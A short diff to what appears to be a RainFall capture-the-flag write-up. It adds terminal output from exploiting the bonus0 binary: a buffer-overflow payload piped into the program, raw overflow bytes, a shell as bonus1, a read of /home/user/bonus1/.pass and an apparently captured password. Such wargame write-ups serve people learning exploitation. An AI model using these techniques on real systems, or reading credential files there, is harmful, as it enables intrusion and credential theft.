@@ -600,4 +600,8 @@ I think it is just incredible!
 	bonus0@RainFall:~$ cat /tmp/bonus0 - | ./bonus0
 	 -
 	 -
-	0000000000000000
+	00000000000000000000123456789_���0000000�� 123456789_���0000000��
+	whoami
+	bonus1
+	cat /home/user/bonus1/.pass
+	cd1f77a58596
